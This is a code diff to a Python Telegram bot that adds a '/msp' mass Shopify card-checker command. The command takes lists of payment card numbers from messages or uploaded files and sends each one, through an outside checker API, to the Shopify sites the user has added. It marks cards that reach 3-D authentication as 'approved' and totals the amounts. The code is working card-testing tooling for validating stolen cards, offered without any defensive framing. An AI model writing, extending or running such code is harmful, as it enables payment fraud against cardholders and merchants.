@@ -3431,6 +3431,130 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_msite_check(sites, msg))
 
 
+import asyncio
+import httpx
+from telegram import Update
+from telegram.ext import ContextTypes
+from db import get_user
+
+MAX_PARALLEL = 3
+API_BASE = "https://auto-shopify-6cz4.onrender.com/index.php"
+
+async def check_card(site: str, card: str) -> dict:
+    """Check a single card on the given site API."""
+    url = f"{API_BASE}?site={site}&cc={card}"
+    async with httpx.AsyncClient(timeout=30) as client:
+        try:
+            resp = await client.get(url)
+            data = resp.json()
+        except Exception:
+            data = {"Response": "PROCESSING_ERROR", "Status": "false", "Price": "0", "Gateway": ""}
+    return {"card": card, **data}
+
+
+async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler for /msp command."""
+    user_id = update.effective_user.id
+    user_data = await get_user(user_id)
+    
+    # get user's site(s)
+    sites = user_data.get("sites", [])
+    if not sites:
+        await update.message.reply_text("❌ You don't have any sites added. Use /setsite to add.")
+        return
+    
+    # get cards from message text or attached file
+    cards = []
+    if update.message.reply_to_message and update.message.reply_to_message.document:
+        file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+        file_bytes = await file.download_as_bytearray()
+        cards = file_bytes.decode().splitlines()
+    else:
+        text = update.message.text.replace("/msp", "").strip()
+        cards = text.splitlines()
+    
+    if not cards:
+        await update.message.reply_text("❌ No cards provided.")
+        return
+    
+    if len(cards) > 100:
+        cards = cards[:100]
+    
+    stats = {"total": len(cards), "working": 0, "dead": 0, "error": 0, "checked": 0, "amt": 0.0, "details": []}
+    
+    # send initial message
+    status_msg = await update.message.reply_text(
+        "📊 𝑴𝒂𝒔𝒔 𝑺hopify 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌍 Total cards : {stats['total']}\n"
+        "✅ Approved     : 0\n"
+        "❌ Declined     : 0\n"
+        "⚠️ Errors       : 0\n"
+        f"🔄 Checked      : 0 / {stats['total']}\n"
+        "💲 Amount       : $0.00\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📝 Site Details\n"
+        "────────────────\n"
+        "Processing..."
+    )
+    
+    semaphore = asyncio.Semaphore(MAX_PARALLEL)
+    
+    async def worker(site, card):
+        async with semaphore:
+            result = await check_card(site, card)
+            stats["checked"] += 1
+            resp_text = result.get("Response", "")
+            price = float(result.get("Price", 0) or 0)
+            
+            if "3D_AUTHENTICATION" in resp_text:
+                stats["working"] += 1
+                stats["amt"] += price
+                prefix = "✅"
+            elif "CARD_DECLINED" in resp_text:
+                stats["dead"] += 1
+                prefix = "❌"
+            elif "PROCESSING_ERROR" in resp_text:
+                stats["error"] += 1
+                prefix = "⚠️"
+            else:
+                prefix = "ℹ️"
+            
+            stats["details"].append({"card": card, "resp": resp_text, "prefix": prefix})
+            
+            # prepare per-card details in monospace
+            details_text = ""
+            for d in stats["details"]:
+                details_text += f"   {d['prefix']} <code>{d['card']}</code> ↳ {d['resp']}\n"
+            
+            # edit status message
+            message_text = (
+                "📊 𝑴𝒂𝒔𝒔 𝑺hopify 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🌍 Total cards : {stats['total']}\n"
+                f"✅ Approved     : {stats['working']}\n"
+                f"❌ Declined     : {stats['dead']}\n"
+                f"⚠️ Errors       : {stats['error']}\n"
+                f"🔄 Checked      : {stats['checked']} / {stats['total']}\n"
+                f"💲 Amount       : ${stats['amt']:.2f}\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "📝 Site Details\n"
+                "────────────────\n"
+                f"{details_text}"
+                "────────────────"
+            )
+            try:
+                await status_msg.edit_text(message_text, parse_mode="HTML")
+            except Exception:
+                pass
+    
+    # run all tasks in parallel
+    tasks = []
+    for site in sites:
+        for card in cards:
+            tasks.append(worker(site, card))
+    
+    await asyncio.gather(*tasks)
 
 
 
@@ -4815,6 +4939,7 @@ def main():
     application.add_handler(CommandHandler("sh", command_with_check(sh_command, "sh")))
     application.add_handler(CommandHandler("seturl", command_with_check(seturl, "seturl")))
     application.add_handler(CommandHandler("mysites", command_with_check(mysites, "mysites")))
+    application.add_handler(CommandHandler("msp", msp))
     application.add_handler(CommandHandler("sp", command_with_check(sp, "sp")))
     application.add_handler(CommandHandler("site", command_with_check(site, "site")))
     application.add_handler(CommandHandler("msite", command_with_check(msite_command, "msite")))
